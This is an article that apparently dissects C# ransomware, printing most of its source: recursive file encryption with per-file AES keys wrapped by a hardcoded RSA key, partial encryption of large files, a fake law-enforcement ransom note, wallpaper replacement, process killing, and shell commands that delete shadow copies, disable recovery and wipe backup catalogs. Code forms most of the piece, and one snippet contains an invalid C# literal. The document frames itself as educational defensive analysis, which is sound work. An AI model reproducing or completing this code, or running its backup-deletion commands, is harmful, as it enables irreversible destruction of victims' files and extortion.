# 🔍 Analyzing a Malicious C# Ransomware Code: A Deep Dive 🕵️‍♂️

This article dissects a sophisticated C# ransomware code, highlighting its malicious functionalities, encryption techniques, and system manipulation tactics. The code is designed to encrypt files, display ransom demands, and evade detection. Below, we explore its key components, illustrating each with the full relevant source code, with an extended focus on the encryption mechanisms `FULL_ENCRYPT` and `TRIPLE_ENCRYPT`.

> **⚠️ Disclaimer**: This analysis is for educational purposes only. Do not execute or distribute this code, as it is malicious and illegal. Understanding such code helps in developing defenses against cyber threats.

---

## 📜 Overview of the Ransomware

The ransomware targets files on a victim's system, encrypts them using AES and RSA algorithms, and demands payment via Telegram for decryption. It modifies the system’s wallpaper, deletes backups, and ensures persistence by adding itself to startup. The code uses multithreading for efficiency and employs stealth techniques like renaming its process to mimic legitimate ones.

Key features include:
- **File Encryption**: Encrypts files with specific extensions or all files except specified ones.
- **Ransom Note**: Drops a `Readme.txt` with instructions.
- **Wallpaper Change**: Displays a threatening message on the desktop.
- **System Manipulation**: Deletes shadow copies, empties the recycle bin, and kills specific processes.
- **Persistence**: Ensures the ransomware runs on system startup.

Let’s break down each component with the corresponding code, with a detailed exploration of the encryption mechanisms.

---

## 🛠️ 1. Main Entry Point and Initial Setup

### Functionality
The `Main` method initializes the ransomware, ensuring only one instance runs using a mutex. It renames the process to mimic a legitimate one (e.g., `Runtime Broker.exe`), adds itself to startup, encrypts files across drives, changes the wallpaper, and performs cleanup tasks like deleting shadow copies.

### Code
```csharp
private static void Main(string[] args)
{
    new Mutex(initiallyOwned: true, Environment.MachineName, out var createdNew);
    if (!createdNew)
    {
        Environment.Exit(0);
    }
    if (CHANGE_PROCESS_NAME != "")
    {
        COPY_FILE(CHANGE_PROCESS_NAME);
    }
    STARTUP();
    Parallel.ForEach(DriveInfo.GetDrives(), delegate(DriveInfo drive)
    {
        if (ENCRYPT_EXTENSIONS)
        {
            LOOK_FOR_EXTENSIONS(drive.ToString());
        }
        else
        {
            LOOK_FOR_EXCEPTIONS(drive.ToString());
        }
    });
    if (ADDITIONAL_FOLDERS.Length > 0)
    {
        Parallel.ForEach(ADDITIONAL_FOLDERS, delegate(string folder)
        {
            if (ENCRYPT_EXTENSIONS)
            {
                LOOK_FOR_EXTENSIONS(folder.ToString());
            }
            else
            {
                LOOK_FOR_EXCEPTIONS(folder.ToString());
            }
        });
    }
    DRAW_WALLPAPER(WALLPAPER_MESSAGE);
    KILL_APPS_ENCRYPT_AGAIN();
    SHADOW_AND_CATALOG();
    RECYCLE_BIN();
}
```

### Analysis
- **Mutex**: Prevents multiple instances, ensuring exclusive control (`new Mutex(...)`).
- **Process Renaming**: Calls `COPY_FILE` to disguise the process as `Runtime Broker.exe`.
- **Startup Persistence**: `STARTUP()` adds the executable to the Windows registry.
- **Parallel Encryption**: Uses `Parallel.ForEach` to encrypt files across all drives efficiently.
- **Cleanup**: Deletes backups (`SHADOW_AND_CATALOG`) and empties the recycle bin (`RECYCLE_BIN`).

---

## 🔐 2. File Encryption Logic

### Functionality
The ransomware supports two encryption modes:
- **Targeted Extensions**: Encrypts files with specific extensions (e.g., `.doc`, `.pdf`) if `ENCRYPT_EXTENSIONS` is `true`.
- **Exception-Based**: Encrypts all files except those with specified extensions or in protected folders.

Files smaller than 512KB are fully encrypted (`FULL_ENCRYPT`), while larger files are partially encrypted at three positions (`TRIPLE_ENCRYPT`). Encrypted files are renamed with a `.FBIRAS` extension, and a ransom note (`Readme.txt`) is dropped in each folder.

### Code (LOOK_FOR_EXCEPTIONS)
```csharp
private static void LOOK_FOR_EXCEPTIONS(string path)
{
    try
    {
        string[] files = Directory.GetFiles(path);
        bool Dropable = true;
        Parallel.ForEach(files, delegate(string file)
        {
            try
            {
                string fileName = Path.GetFileName(file);
                string Extension = Path.GetExtension(file).ToLower();
                if (!EXCEPTIONAL_FILE(fileName) && !Array.Exists(TARGETED_EXTENSIONS, (string E) => E == Extension) && Extension != "" && fileName != MESSAGE_FILE)
                {
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.IsReadOnly)
                    {
                        try
                        {
                            fileInfo.Attributes = FileAttributes.Normal;
                        }
                        catch
                        {
                        }
                    }
                    if (fileInfo.Length < 524288)
                    {
                        FULL_ENCRYPT(file);
                        File.Move(file, file + EXTENSION());
                    }
                    else if (fileInfo.Length > 512KB)
                    {
                        TRIPLE_ENCRYPT(file, 131072, 0, fileInfo.Length / 2, fileInfo.Length - 131072);
                        File.Move(file, file + EXTENSION());
                    }
                    if (Dropable)
                    {
                        Dropable = false;
                        string path2 = path + "/" + MESSAGE_FILE;
                        if (!File.Exists(path2))
                        {
                            File.WriteAllText(path2, TEXT_MESSAGE);
                        }
                    }
                }
            }
            catch
            {
            }
        });
        string[] directories = Directory.GetDirectories(path);
        Parallel.ForEach(directories, delegate(string SubdDirectory)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(SubdDirectory);
            if (directoryInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
            {
                try
                {
                    directoryInfo.Attributes &= ~FileAttributes.Normal;
                }
                catch
                {
                }
            }
            if (!EXCEPTIONAL_FOLDER(directoryInfo.Name) && !EXCEPTIONAL_PATH(SubdDirectory))
            {
                LOOK_FOR_EXCEPTIONS(SubdDirectory);
            }
        });
    }
    catch
    {
    }
}
```

### Analysis
- **File Filtering**: Skips protected files (`EXCEPTIONAL_FILE`) and folders (`EXCEPTIONAL_FOLDER`/`EXCEPTIONAL_PATH`).
- **Read-Only Handling**: Removes read-only attributes to ensure encryption.
- **Encryption Strategy**:
  - Small files (<512KB): Fully encrypted with AES-256 (`FULL_ENCRYPT`).
  - Large files (>512KB): Encrypts 128KB at the start, middle, and end (`TRIPLE_ENCRYPT`).
- **Ransom Note**: Drops `Readme.txt` once per folder (`Dropable` flag).
- **Recursion**: Traverses subdirectories, skipping system folders like `C:\Windows`.

---

## 🔑 3. Encryption Mechanisms: FULL_ENCRYPT and TRIPLE_ENCRYPT

### Functionality
The ransomware employs a hybrid encryption approach combining **AES-256 (CBC mode)** for file content encryption and **RSA** for securing the AES keys. It uses two distinct methods based on file size:
- **`FULL_ENCRYPT`**: Fully encrypts files smaller than 512KB, replacing their contents entirely.
- **`TRIPLE_ENCRYPT`**: Partially encrypts larger files (>512KB) at three specific positions (start, middle, and end), making them unusable without decryption.

Both methods generate a random AES key (32 bytes) and initialization vector (IV, 16 bytes) per file, encrypt these with RSA using a hardcoded public key, and append the RSA-encrypted key/IV to the file. This ensures that only the attacker, with the corresponding RSA private key, can decrypt the files.

### Code (FULL_ENCRYPT)
```csharp
private static void FULL_ENCRYPT(string filePath)
{
    byte[] array = File.ReadAllBytes(filePath);
    string text = RANDOM_STRING(32);
    string text2 = RANDOM_STRING(16);
    byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
    byte[] array2 = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
    using FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write);
    fileStream.SetLength(0L);
    byte[] array3 = null;
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        rijndaelManaged.Key = Encoding.ASCII.GetBytes(text);
        rijndaelManaged.IV = Encoding.ASCII.GetBytes(text2);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(array, 0, array.Length);
        }
        array3 = memoryStream.ToArray();
    }
    fileStream.Write(array3, 0, array3.Length);
    fileStream.Seek(0L, SeekOrigin.End);
    fileStream.Write(array2, 0, array2.Length);
}
```

### Detailed Analysis of FULL_ENCRYPT
The `FULL_ENCRYPT` method is used for files smaller than 512KB (524,288 bytes) to encrypt their entire contents. Here’s a step-by-step breakdown:

1. **Read File Contents**:
   - The entire file is read into a byte array (`File.ReadAllBytes(filePath)`), storing the original data in memory.

2. **Generate Random Keys**:
   - A 32-byte AES key (`text`) and a 16-byte IV (`text2`) are generated using `RANDOM_STRING`, which produces cryptographically random strings from a predefined character set (`RANDOM_VALUE`).
   - These are converted to ASCII bytes for use in AES encryption.

3. **RSA Encryption of Key and IV**:
   - The AES key and IV are concatenated with a pipe separator (`key|IV`) and converted to a byte array.
   - This byte array is encrypted using RSA with a hardcoded public key (`RSA_PUBLIC_KEY`) via the `RSA_ENCRYPT` method, producing `array2`.
   - The RSA encryption ensures that only the attacker’s private key can decrypt the AES key and IV, locking the file securely.

4. **AES Encryption of File Contents**:
   - A `RijndaelManaged` instance is configured with:
     - **Key Size**: 256 bits (32 bytes).
     - **Block Size**: 128 bits (16 bytes).
     - **Mode**: Cipher Block Chaining (CBC), which chains each block’s encryption with the previous block’s ciphertext.
     - **Padding**: None (though this may cause issues if the file size isn’t a multiple of the block size, indicating a potential bug or reliance on file alignment).
   - The file’s byte array is written to a `CryptoStream`, which encrypts the data using the AES key and IV.
   - The encrypted data is stored in a `MemoryStream` and extracted as `array3`.

5. **Write Encrypted Data**:
   - The original file is opened with `FileStream`, and its contents are cleared (`SetLength(0)`).
   - The encrypted data (`array3`) is written to the file.
   - The RSA-encrypted key/IV (`array2`) is appended to the end of the file.

6. **Implications**:
   - The file’s original contents are completely replaced with encrypted data, making it inaccessible without the AES key.
   - The appended RSA-encrypted key/IV ensures that decryption requires the attacker’s private key.
   - For small files, full encryption is efficient and ensures complete data loss without decryption.

**Potential Weakness**:
- The lack of padding (`PaddingMode.None`) may cause errors for files whose sizes aren’t multiples of the AES block size (16 bytes). This could lead to incomplete encryption or crashes, though small files are less likely to encounter this issue.

### Code (TRIPLE_ENCRYPT)
```csharp
private static void TRIPLE_ENCRYPT(string filePath, int length, int beginning, long middle, long end)
{
    string text = RANDOM_STRING(32);
    string text2 = RANDOM_STRING(16);
    byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
    byte[] array = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
    using FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite);
    fileStream.Position = beginning;
    byte[] array2 = new byte[length];
    fileStream.Read(array2, 0, length);
    byte[] array3 = ENCRYPT_DATA(text, text2, array2);
    fileStream.Position = beginning;
    fileStream.Write(array3, 0, array3.Length);
    fileStream.Position = middle;
    byte[] array4 = new byte[length];
    fileStream.Read(array4, 0, length);
    byte[] array5 = ENCRYPT_DATA(text, text2, array4);
    fileStream.Position = middle;
    fileStream.Write(array5, 0, array5.Length);
    fileStream.Position = end;
    byte[] array6 = new byte[length];
    fileStream.Read(array6, 0, length);
    byte[] array7 = ENCRYPT_DATA(text, text2, array6);
    fileStream.Position = end;
    fileStream.Write(array7, 0, array7.Length);
    fileStream.Seek(0L, SeekOrigin.End);
    fileStream.Write(array, 0, array.Length);
}
```

### Detailed Analysis of TRIPLE_ENCRYPT
The `TRIPLE_ENCRYPT` method is used for files larger than 512KB to encrypt three 128KB (131,072 bytes) chunks at the beginning, middle, and end of the file. This partial encryption balances speed and effectiveness, as encrypting key portions of large files is often sufficient to render them unusable. Here’s a step-by-step breakdown:

1. **Generate Random Keys**:
   - Similar to `FULL_ENCRYPT`, a 32-byte AES key (`text`) and a 16-byte IV (`text2`) are generated using `RANDOM_STRING`.
   - These are concatenated (`key|IV`), converted to bytes, and encrypted with RSA to produce `array`.

2. **Define Encryption Positions**:
   - The method encrypts three 128KB chunks at:
     - **Beginning**: Starting at offset 0 (`beginning`).
     - **Middle**: Starting at the file’s midpoint (`fileInfo.Length / 2`).
     - **End**: Starting 128KB before the file’s end (`fileInfo.Length - 131072`).
   - The chunk size is fixed at 128KB (`length = 131072`).

3. **Encrypt Each Chunk**:
   - For each position (beginning, middle, end):
     - A 128KB chunk is read into a byte array (e.g., `array2` for the beginning).
     - The chunk is encrypted using the `ENCRYPT_DATA` method, which applies AES-256 in CBC mode with the generated key and IV, producing an encrypted chunk (e.g., `array3`).
     - The file stream is repositioned to the chunk’s starting offset, and the encrypted chunk is written back, overwriting the original data.
   - This process repeats for the middle (`array4` → `array5`) and end (`array6` → `array7`) chunks.

4. **Append RSA-Encrypted Key/IV**:
   - The RSA-encrypted key/IV (`array`) is appended to the end of the file, similar to `FULL_ENCRYPT`.

5. **Implications**:
   - Encrypting only three portions of a large file is faster than full encryption, making the ransomware scalable for large datasets.
   - For many file types (e.g., videos, databases), corrupting the start, middle, and end is sufficient to prevent access, as these sections often contain critical headers or data structures.
   - The appended RSA-encrypted key/IV ensures that decryption requires the attacker’s private key.

**Why Partial Encryption?**:
- **Efficiency**: Encrypting entire large files (e.g., multi-GB videos) is time-consuming and resource-intensive. Partial encryption achieves the same goal—rendering the file unusable—with less overhead.
- **Effectiveness**: Most file formats rely on specific data at the start (e.g., file headers) or throughout (e.g., database indices). Corrupting these sections prevents software from reading the file correctly.
- **Stealth**: Faster encryption reduces the time the ransomware is active, lowering the chance of detection by antivirus software.

**Potential Weakness**:
- Some file types may remain partially usable if critical data isn’t in the encrypted chunks. For example, text files or certain media files might retain some readable content.
- Like `FULL_ENCRYPT`, the lack of padding in `ENCRYPT_DATA` could cause issues if chunk sizes aren’t block-aligned, though the fixed 128KB size mitigates this risk.

### Code (ENCRYPT_DATA - Supporting Method)
```csharp
private static byte[] ENCRYPT_DATA(string KEY, string IV, byte[] plainText)
{
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.KeySize = 256;
    rijndaelManaged.BlockSize = 128;
    rijndaelManaged.Key = Encoding.ASCII.GetBytes(KEY);
    rijndaelManaged.IV = Encoding.ASCII.GetBytes(IV);
    rijndaelManaged.Mode = CipherMode.CBC;
    rijndaelManaged.Padding = PaddingMode.None;
    ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
    return cryptoTransform.TransformFinalBlock(plainText, 0, plainText.Length);
}
```

### Analysis of ENCRYPT_DATA
- This helper method performs the AES encryption for both `FULL_ENCRYPT` and `TRIPLE_ENCRYPT`.
- It uses the same AES-256 CBC configuration as `FULL_ENCRYPT`, with no padding.
- It’s called for each 128KB chunk in `TRIPLE_ENCRYPT`, ensuring consistent encryption across all targeted file portions.

### Comparison of FULL_ENCRYPT vs. TRIPLE_ENCRYPT
| Feature                | FULL_ENCRYPT                          | TRIPLE_ENCRYPT                        |
|------------------------|---------------------------------------|---------------------------------------|
| **File Size**          | < 512KB                              | > 512KB                              |
| **Encryption Scope**   | Entire file                          | Three 128KB chunks (start, middle, end) |
| **Performance**        | Slower for larger files              | Faster for large files               |
| **Effectiveness**      | Complete data loss                   | Partial corruption, often sufficient |
| **Key/IV Handling**    | RSA-encrypted, appended to file      | RSA-encrypted, appended to file      |
| **Use Case**           | Small files (e.g., documents)        | Large files (e.g., videos, databases) |

### Security Strength
- **AES-256**: A robust symmetric encryption algorithm, virtually unbreakable with current technology if keys are secure.
- **RSA**: The use of a public key ensures that the AES key/IV can only be decrypted by the attacker, making unauthorized decryption infeasible without the private key.
- **Random Keys**: Per-file random keys and IVs prevent a single decryption key from unlocking all files, increasing the attack’s resilience.

---

## 🖼️ 4. Wallpaper Modification

### Functionality
The ransomware changes the desktop wallpaper to display a ransom message, increasing user panic. It creates a black JPEG with white text centered on the screen.

### Code
```csharp
public static void DRAW_WALLPAPER(string[] lines)
{
    Rectangle bounds = Screen.PrimaryScreen.Bounds;
    int width = bounds.Width;
    int height = bounds.Height;
    Bitmap val = new Bitmap(width, height);
    Graphics val2 = Graphics.FromImage((Image)(object)val);
    try
    {
        val2.Clear(ColorTranslator.FromHtml("Black"));
        Font val3 = new Font("Arial", 36f, (FontStyle)1);
        SolidBrush val4 = new SolidBrush(ColorTranslator.FromHtml("White"));
        StringFormat val5 = new StringFormat();
        val5.Alignment = (StringAlignment)1;
        val5.LineAlignment = (StringAlignment)1;
        int num = (int)(val3.GetHeight() + 5f);
        int num2 = height / 2 - lines.Length / 2 * num;
        foreach (string text in lines)
        {
            val2.DrawString(text, val3, (Brush)(object)val4, new RectangleF(0f, num2, width, num), val5);
            num2 += num;
        }
    }
    finally
    {
        ((IDisposable)val2)?.Dispose();
    }
    string text2 = Path.GetTempPath() + RANDOM_STRING(9) + ".jpg";
    ((Image)val).Save(text2, ImageFormat.Jpeg);
    SystemParametersInfo(20u, 0u, text2, 3u);
}
```

### Analysis
- **Dynamic Wallpaper**: Creates a bitmap matching the screen resolution.
- **Text Display**: Centers the `WALLPAPER_MESSAGE` array (e.g., “All your files are stolen and encrypted”) in bold Arial font.
- **System Call**: Uses `SystemParametersInfo` to set the new wallpaper persistently.

---

## 🛡️ 5. Anti-Recovery and Evasion Tactics

### Functionality
The ransomware maximizes damage by:
- **Killing Processes**: Terminates processes like antivirus or backup tools.
- **Deleting Backups**: Removes shadow copies and system restore points.
- **Emptying Recycle Bin**: Ensures deleted files are unrecoverable.
- **Persistence**: Copies itself to a new location and adds to startup.

### Code (SHADOW_AND_CATALOG)
```csharp
private static void SHADOW_AND_CATALOG()
{
    SHELL_COMMAND("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
    SHELL_COMMAND("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
    SHELL_COMMAND("wbadmin delete catalog -quiet");
}
```

### Code (KILL_APPS_ENCRYPT_AGAIN)
```csharp
private static void KILL_APPS_ENCRYPT_AGAIN()
{
    string[] array = new string[50]
    {
        "sqlwriter", "sqbcoreservice", "VirtualBoxVM", "sqlagent", "sqlbrowser", "sqlservr", "code", "steam", "zoolz", "agntsvc",
        // ... (other process names)
    };
    string[] array2 = array;
    foreach (string processName in array2)
    {
        Process[] processesByName = Process.GetProcessesByName(processName);
        foreach (Process process in processesByName)
        {
            process.CloseMainWindow();
        }
    }
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo drive in drives)
    {
        TaskFactory factory = Task.Factory;
        Action action = delegate
        {
            if (ENCRYPT_EXTENSIONS)
            {
                LOOK_FOR_EXTENSIONS(drive.ToString());
            }
            else
            {
                LOOK_FOR_EXCEPTIONS(drive.ToString());
            }
        };
        factory.StartNew(action).Wait();
    }
}
```

### Analysis
- **Process Termination**: Targets 50 processes, including SQL services, VirtualBox, and antivirus tools, to prevent interference.
- **Backup Deletion**: Executes commands to delete shadow copies (`vssadmin`), disable recovery (`bcdedit`), and clear backup catalogs (`wbadmin`).
- **Re-Encryption**: Re-scans drives to encrypt any new or missed files.
- **Recycle Bin**: Uses `SHEmptyRecycleBin` to permanently delete files.

---

## 📝 6. Ransom Note

### Functionality
The ransomware drops a `Readme.txt` file in each encrypted folder, claiming to be from “Law Enforcement” and demanding payment via Telegram (`@Lawinfo19`).

### Code
```csharp
private static string TEXT_MESSAGE = "Attention Tax payer:" + Environment.NewLine + Environment.NewLine + 
    "All Your files have been locked with ransomware by law enforcement for violating cyber laws. " +
    // ... (full ransom note text)
    "Sincerely," + Environment.NewLine + Environment.NewLine + "Law Enforcement" + Environment.NewLine;
```

### Analysis
- **Social Engineering**: Poses as a legitimate authority to scare victims.
- **Instructions**: Directs users to contact the attacker via Telegram, implying a fine for “criminal activity.”
- **Threats**: Warns of permanent file deletion or increased fines for non-compliance.

---

## 🛑 Mitigation Strategies

To protect against such ransomware:
- **Backups**: Regularly back up data offline or on secure cloud storage.
- **Antivirus**: Use updated antivirus software to detect malicious executables.
- **Least Privilege**: Run applications with minimal permissions to limit damage.
- **Education**: Train users to recognize phishing and avoid suspicious downloads.
- **System Hardening**: Disable unnecessary services and restrict command-line access to prevent backup deletion.

---

## 🎯 Conclusion

This C# ransomware is a potent example of modern malware, combining advanced encryption, system manipulation, and psychological tactics. The `FULL_ENCRYPT` and `TRIPLE_ENCRYPT` methods demonstrate a strategic approach to balancing efficiency and impact, with robust AES and RSA encryption ensuring data inaccessibility. By understanding its inner workings, developers and security professionals can better design defenses. Stay vigilant, keep systems updated, and always have a robust backup strategy to mitigate such threats.

Stay safe in the digital world! 🌐🔒
```